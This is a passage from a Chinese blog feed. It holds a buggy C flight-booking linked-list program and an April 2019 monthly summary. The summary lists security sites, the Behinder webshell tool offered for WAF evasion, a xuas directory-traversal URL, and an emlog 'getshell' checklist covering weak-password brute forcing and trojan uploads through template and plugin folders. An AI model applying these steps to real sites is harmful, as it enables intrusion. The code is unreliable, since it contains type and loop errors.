class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">customer</span> &#123;</span>    <span class="comment">/*乘客结构体*/</span></span><br><span class="line"><span class="keyword">char</span> name[<span class="number">20</span>];</span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line"><span class="keyword">int</span> seat;</span><br><span class="line"><span class="keyword">char</span> sex[<span class="number">10</span>];</span><br><span class="line"><span class="keyword">char</span> goal[<span class="number">10</span>];</span><br><span class="line"><span class="keyword">char</span> type[<span class="number">1</span>];</span><br><span class="line">&#125;Customer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">list</span> &#123;</span>    <span class="comment">/*将乘客规划为数组*/</span></span><br><span class="line">    Customer *<span class="built_in">array</span>[<span class="number">25</span>];     <span class="comment">/*最大存放25人*/</span></span><br><span class="line">    <span class="keyword">int</span> length;</span><br><span class="line">&#125;sqList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span> &#123;</span>    <span class="comment">/*将飞机规划为链表*/</span></span><br><span class="line">    <span class="keyword">int</span> number;</span><br><span class="line"><span class="keyword">int</span> input;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;Node;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> temp1 = <span class="number">0</span>;    <span class="comment">/*航班计数器*/</span></span><br><span class="line"><span class="keyword">int</span> temp2 = <span class="number">0</span>;    <span class="comment">/*人数计数器*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">createPlane</span><span class="params">(Node *L)</span> </span>&#123;    <span class="comment">/*创建飞机链表*/</span></span><br><span class="line">    <span class="keyword">int</span> x, y;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"请输入飞机序号(序号为0时输入完毕)："</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;x);</span><br><span class="line">        <span class="keyword">if</span> (x != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"请输入登机口："</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;y);</span><br><span class="line">            Node *q;    <span class="comment">/*定义新节点*/</span></span><br><span class="line">            q = (Node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">            temp1++;</span><br><span class="line">            q -&gt; number = x;</span><br><span class="line">            q -&gt; input = y;</span><br><span class="line">            L -&gt; next = q;</span><br><span class="line">            L = q;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">while</span>(x != <span class="number">0</span>);    <span class="comment">/*飞机序号为0时结束*/</span></span><br><span class="line">    L -&gt; next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">deleteNode</span><span class="params">(Node *L)</span> </span>&#123;    <span class="comment">/*删除飞机节点*/</span></span><br><span class="line">    <span class="keyword">int</span> num;</span><br><span class="line">    Node *q;</span><br><span class="line">    q = L;</span><br><span class="line">    Node *r = q;</span><br><span class="line">    q = q -&gt; next;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入要删除的飞机序号（警告该飞机下的乘客全部删除！）："</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;num);</span><br><span class="line">    <span class="keyword">while</span>(q != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (q -&gt; number == num) &#123;</span><br><span class="line">            r -&gt; next = q -&gt; next;</span><br><span class="line">            <span class="built_in">free</span>(q);</span><br><span class="line">            temp1--;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            q = q -&gt; next;</span><br><span class="line">            r = r -&gt; next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"未找到该飞机！"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">initSqList</span> <span class="params">(sqList *S)</span> </span>&#123;    <span class="comment">/*容器初始化*/</span></span><br><span class="line">    S -&gt; length = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">createSqList</span> <span class="params">(Node *L, sqList *S)</span> </span>&#123;   <span class="comment">/*构造乘客容器*/</span></span><br><span class="line">    <span class="keyword">int</span> x, y, i;</span><br><span class="line">    Node *q;</span><br><span class="line">    q = L;</span><br><span class="line">    q = q -&gt; next;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入乘客所在飞机号："</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;x);</span><br><span class="line">    <span class="keyword">while</span> (q != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (q -&gt; number == x) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"该飞机共有几名乘客:"</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;y);</span><br><span class="line">            <span class="keyword">for</span> (i = temp2 + <span class="number">1</span>; i &lt;= y; i++) &#123;</span><br><span class="line">            S -&gt; <span class="built_in">array</span>[i] = createCustomer(i);</span><br><span class="line">            S -&gt; length ++;</span><br><span class="line">            temp2++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> S;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            q = q -&gt; next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"未找到该飞机序号！"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">createCustomer</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123;    <span class="comment">/*创建新乘客*/</span></span><br><span class="line">    Customer *q;</span><br><span class="line">    q = (Customer*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Customer));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入乘客身份识别号："</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;(q -&gt; id));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入乘客姓名："</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, &amp;(q -&gt; name));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入座位号："</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;(q -&gt; seat));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入乘客性别："</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, &amp;(q-&gt; sex));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入目的地："</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, &amp;(q -&gt; goal));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入舱位种类: "</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, &amp;(q -&gt; type));</span><br><span class="line">    <span class="keyword">return</span> q;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">searchPlane</span><span class="params">(Node *L)</span> </span>&#123;    <span class="comment">/*搜寻航班*/</span></span><br><span class="line">    <span class="keyword">int</span> x, y;</span><br><span class="line">    Node *q;</span><br><span class="line">    q = L;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入航班序号："</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;x);</span><br><span class="line">    <span class="keyword">while</span> (q != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (x == q -&gt; number) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"找到该航班！\n"</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"航班序号：%d, 登机口:%d\n"</span>, q -&gt; number, q -&gt; input);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            q = q -&gt; next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"未找到该航班\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">searchCustomer</span><span class="params">(Node *L, sqList *S)</span> </span>&#123;    <span class="comment">/*搜寻乘客*/</span></span><br><span class="line">    <span class="keyword">int</span> x, y, i;</span><br><span class="line">    <span class="keyword">char</span> s;</span><br><span class="line">    Node *q;</span><br><span class="line">    q = L;</span><br><span class="line">    q = q -&gt; next;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入乘客所在飞机号："</span>);    <span class="comment">/*检测飞机是否存在*/</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;x);</span><br><span class="line">    <span class="keyword">while</span>(q != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (q -&gt; number == x) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            q = q -&gt; next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (q == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"未找到该飞机\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入乘客身份识别号："</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;y);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= temp2; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (y == S -&gt; <span class="built_in">array</span>[i] -&gt; id) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"找到乘客，打印出数据：\n"</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"乘客姓名：%s\n"</span>, S -&gt; <span class="built_in">array</span>[i] -&gt; name);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"乘客身份识别号：%d\n"</span>, S -&gt; <span class="built_in">array</span>[i] -&gt; id);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"乘客座位号：%d\n"</span>, S -&gt; <span class="built_in">array</span>[i] -&gt; seat);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"乘客目的地: %s\n"</span>, S -&gt; <span class="built_in">array</span>[i] -&gt; goal);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"舱位种类：%s\n"</span>, S -&gt; <span class="built_in">array</span>[i] -&gt; type);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"未找到该乘客\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">reserve</span><span class="params">(Node *L, sqList *S)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">int</span> i;</span><br><span class="line">    L = L -&gt; next;</span><br><span class="line">    FILE *fp = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> ((fp = fopen(<span class="string">"Customer.txt"</span>, <span class="string">"w"</span>)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"不能打开文件！"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fprintf</span>(fp, <span class="string">"%d\n"</span>, temp1);</span><br><span class="line">    <span class="built_in">fprintf</span>(fp, <span class="string">"%d\n"</span>, temp2);</span><br><span class="line">    <span class="keyword">while</span> (L != <span class="literal">NULL</span>) &#123;    <span class="comment">/*保存飞机节点*/</span></span><br><span class="line">        <span class="built_in">fprintf</span>(fp,<span class="string">"%d %d\n"</span>, L -&gt; number, L -&gt; input);</span><br><span class="line">        L = L -&gt; next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= temp2; i++) &#123;    <span class="comment">/*保存乘客节点*/</span></span><br><span class="line">        <span class="built_in">fprintf</span>(fp, <span class="string">"%s %d %d %s %s %s\n"</span>, S -&gt; <span class="built_in">array</span>[i] -&gt; name, S -&gt; <span class="built_in">array</span>[i] -&gt; id, S -&gt; <span class="built_in">array</span>[i] -&gt; seat,</span><br><span class="line">                 S -&gt; <span class="built_in">array</span>[i] -&gt; sex, S -&gt; <span class="built_in">array</span>[i] -&gt; goal, S -&gt; <span class="built_in">array</span>[i] -&gt; type);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fprintf</span>(fp, <span class="string">"%d\n"</span>, S -&gt; length);</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"成功完成"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">read</span><span class="params">(Node *L, sqList*S)</span> </span>&#123;</span><br><span class="line">    FILE *fp = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    Node *q;</span><br><span class="line">    <span class="keyword">if</span> ((fp = fopen(<span class="string">"Customer.txt"</span>, <span class="string">"r"</span>)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"不能打开文件！"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fscanf</span>(fp, <span class="string">"%d\n"</span>, &amp;temp1);</span><br><span class="line">    <span class="built_in">fscanf</span>(fp, <span class="string">"%d\n"</span>, &amp;temp2);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; temp1; i++) &#123;    <span class="comment">/*读取飞机数据*/</span></span><br><span class="line">        q = (Node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">        <span class="built_in">fscanf</span>(fp, <span class="string">"%d %d\n"</span>, &amp;q -&gt; number, &amp;q -&gt; input);</span><br><span class="line">        L -&gt; next = q;</span><br><span class="line">        L = q;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= temp2; i++); &#123;</span><br><span class="line">        Customer *temp;</span><br><span class="line">        temp = (Customer*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Customer));</span><br><span class="line">        <span class="built_in">fscanf</span>(fp,<span class="string">"%s %d %d %s %s %s\n"</span>, &amp;temp -&gt; name, &amp;temp -&gt; id, &amp;temp -&gt; seat, &amp;temp -&gt; sex, &amp;temp -&gt; goal,</span><br><span class="line">            &amp;temp -&gt; type);</span><br><span class="line">        S -&gt; <span class="built_in">array</span>[i] = temp;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="built_in">fscanf</span>(fp ,<span class="string">"%d\n"</span>, &amp;S -&gt; length);</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"成功完成"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Node *L;</span><br><span class="line">    sqList *S;</span><br><span class="line">    L = (Node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">    S = (sqList*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(sqList));</span><br><span class="line">    initSqList(&amp;S);</span><br><span class="line">    <span class="keyword">int</span> ch;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"                       --------飞机票预订系统--------\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"                               1.创建航班\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"                               2.创建乘客\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"                               3.查询航班信息\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"                               4.查询乘客信息\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"                               5.保存信息\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"                               6.读取信息\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"                               7.删除飞机信息\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"                               0.退出系统\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"请输入您的选择:"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;ch);</span><br><span class="line">        <span class="keyword">switch</span> (ch) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:createPlane(&amp;L);<span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:S = createSqList(&amp;L, &amp;S);<span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:searchPlane(&amp;L);<span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:searchCustomer(&amp;L, S);<span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">5</span>:reserve(&amp;L, S);<span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">6</span>:read(&amp;L, &amp;S);<span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">7</span>:deleteNode(&amp;L);<span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://github.com/moyui/datastructure" target="_blank" rel="noopener">源码参考</a></p>]]></content>
      
      
      <categories>
          
          <category> 总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一九年四月总结</title>
      <link href="/%E4%B8%80%E4%B9%9D%E5%B9%B4%E5%9B%9B%E6%9C%88/"/>
      <url>/%E4%B8%80%E4%B9%9D%E5%B9%B4%E5%9B%9B%E6%9C%88/</url>
      
        <content type="html"><![CDATA[<hr><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/1904.jpg" alt=""></p><a id="more"></a><h1 id="一九年四月总结"><a href="#一九年四月总结" class="headerlink" title="一九年四月总结"></a>一九年四月总结</h1><h2 id="论坛："><a href="#论坛：" class="headerlink" title="论坛："></a>论坛：</h2><p>日本技术论坛:<a href="https://qiita.com/" target="_blank" rel="noopener">qiita</a>  </p><p>Medium:是一个博客发布平台，由 Twitter 联合创办人埃文·威廉姆斯和比兹·斯通于2012年8月创办。该平台有专业和非专业的贡献者，亦有受雇的编者，是社会新闻报导的例子之一。<a href="https://medium.com/websec" target="_blank" rel="noopener">websec文章</a></p><p>vulnspy:一个带有漏洞复现，漏洞博客的站点，<a href="https://www.vulnspy.com/" target="_blank" rel="noopener">点击访问</a></p><p>chabug团队论坛：<a href="https://www.chabug.org/" target="_blank" rel="noopener">点击访问</a></p><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>外链转换网站:<a href="https://link.hhtjim.com/" target="_blank" rel="noopener">网站链接</a></p><p>iTunes实现PC到ipad文件传输：<a href="https://zhidao.baidu.com/question/422281453.html" target="_blank" rel="noopener">百度知道</a></p><p>音乐外链:<a href="http://mp34.butterfly.mopaasapp.com/" target="_blank" rel="noopener">热门歌曲下载</a></p><p>漏洞查询网站:<a href="https://www.exploit-db.com/" target="_blank" rel="noopener">exploit-db</a></p><p>过狗工具冰蝎:<a href="https://github.com/rebeyond/Behinder/releases" target="_blank" rel="noopener">下载地址</a></p><p>电报安卓旧版:<a href="https://telegram.cn.uptodown.com/android/old" target="_blank" rel="noopener">下载地址</a></p><h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><h3 id="讯时系统-xuas-后台漏洞"><a href="#讯时系统-xuas-后台漏洞" class="headerlink" title="讯时系统(xuas)后台漏洞"></a>讯时系统(xuas)后台漏洞</h3><p>回显后台：</p><blockquote><p>/admin/admin_news_pl_view.asp?id=1</p></blockquote><p>列目录漏洞：</p><blockquote><p><a href="http://www.xx.com/edit/admin_uploadfile.asp?id=46&amp;dir=../." target="_blank" rel="noopener">http://www.xx.com/edit/admin_uploadfile.asp?id=46&amp;dir=../.</a>.</p></blockquote><p>漏洞参考文章</p><p><a href="https://www.nuoweb.com/hack/398.html" target="_blank" rel="noopener">讯时系统(xuas)最新通杀漏洞0day图文说明</a></p><p><a href="https://www.jb51.net/hack/44598.html" target="_blank" rel="noopener">讯时后台管理系统v4.9的鸡肋漏洞分析</a></p><h3 id="emblog拿shell思路"><a href="#emblog拿shell思路" class="headerlink" title="emblog拿shell思路"></a>emblog拿shell思路</h3><p>1.后台爆破试试弱口令</p><p>2.上传模板拿shell，模板文件夹中放入木马，路径为content/templates/模板名/木马名</p><p>3.上传插件拿shell，插件文件夹中放入木马，路径为content/plugins/模板名/木马名</p><p>4.设置那里有个“允许上传的附件类型 ”，加入asp文件类型（emlog限制了添加php的后缀，没把asp的给限制）<code>未验证是否可行</code></p><p>漏洞参考文章</p><p><a href="http://www.hacksec.cn/Penetration-test/22.html" target="_blank" rel="noopener">emlog后台拿shell方法合集</a></p><p><a href="https://www.leavesongs.com/PENETRATION/emlog-writter-sql-inj.html" target="_blank" rel="noopener">emlog后台作者权限SQL注入</a></p><p><a href="https://www.jianshu.com/p/01864139dfc7" target="_blank" rel="noopener">针对emlog友情链接插件审计出的SQL注入漏洞</a></p><p><a href="https://www.cesafe.com/6518.html" target="_blank" rel="noopener">emlog全版本后台GetShell 视频教程</a></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><h3 id="冰蝎"><a href="#冰蝎" class="headerlink" title="冰蝎"></a>冰蝎</h3><p>1.<a href="https://www.chabug.org/web/580.html" target="_blank" rel="noopener">冰蝎动态二进制加密过waf并修改自己菜刀过狗</a></p><p>2.<a href="https://github.com/rebeyond/Behinder" target="_blank" rel="noopener">冰蝎项目readme</a></p><h2 id="伪造电子邮件以及制造电子邮件炸弹的攻防探讨"><a href="#伪造电子邮件以及制造电子邮件炸弹的攻防探讨" class="headerlink" title="伪造电子邮件以及制造电子邮件炸弹的攻防探讨"></a>伪造电子邮件以及制造电子邮件炸弹的攻防探讨</h2><p><a href="https://www.freebuf.com/sectool/184555.html" target="_blank" rel="noopener">freebuf文章</a>,<a href="https://www.tr0y.wang/2018/09/26/email-hacker/" target="_blank" rel="noopener">作者的个人博客</a></p><h2 id="github学习项目"><a href="#github学习项目" class="headerlink" title="github学习项目"></a>github学习项目</h2><p>1.<a href="https://lib-pku.github.io/" target="_blank" rel="noopener">“北大图书馆”Github传送门</a></p><p>2.<a href="https://github.com/QSCTech" target="_blank" rel="noopener">浙大项目传送门</a><br>3.<a href="https://github.com/PKUanonym" target="_blank" rel="noopener">清华大学共享了计算机系课程资源</a><br>4.<a href="https://github.com/mbinary" target="_blank" rel="noopener">中科大共享了计算机学院的课程资源</a></p><p>5.<a href="https://github.com/CoolPhilChen" target="_blank" rel="noopener">上海交大共享了14门关于计算机和高数的课程资源</a></p><h2 id="给四月的一些碎碎念"><a href="#给四月的一些碎碎念" class="headerlink" title="给四月的一些碎碎念"></a>给四月的一些碎碎念</h2><p>四月，慢慢地自己进入了考研复习的状态，但是并没有全身心的投入，以至于瞎搞了这些四月的技术方面的骚操作。博客在四月后到考研结束，骚操作将不会更新。可能会更新一些算法吧，一来是为了复习数据结构，二来是提升一下编程能力。万一复习得不错选了一个有机试的学校呢？</p><p>希望自己不要辜负大学最后一段青春，愿自己如愿以偿。</p><p><code>放下所有无关的东西，好好学习天天向上。</code></p><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/12.png" alt="Give time,Let the past pass"></p>]]></content>
      
      
      <categories>
          
          <category> 总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一九年三月总结</title>
      <link href="/%E4%B8%80%E4%B9%9D%E5%B9%B4%E4%B8%89%E6%9C%88/"/>
      <url>/%E4%B8%80%E4%B9%9D%E5%B9%B4%E4%B8%89%E6%9C%88/</url>
      
